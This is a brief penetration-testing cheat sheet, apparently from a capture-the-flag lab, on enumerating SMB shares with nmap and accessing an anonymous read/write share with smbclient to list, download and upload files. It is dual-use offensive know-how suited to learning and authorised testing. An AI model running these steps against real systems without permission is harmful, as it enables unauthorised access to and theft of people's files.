Nmap for shares:
```
nmap -p 445 --script smb-enum-shares <target-ip>
```

In Nmap scan look for shares running with READ/WRITE Access
```
smb-enum-shares: 
|   \\10.10.24.9\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
```

### Steps to Exploiting shares
1. Use `smbclient` to connect without credentials.
``` bash
smbclient //10.10.24.9/anonymous -N
```

2. List Files in the Share
```
ls
```

3. Download files from share
```
get <FileName>
```

4. (optional) Upload files if needed
```
Put <Filename>
```
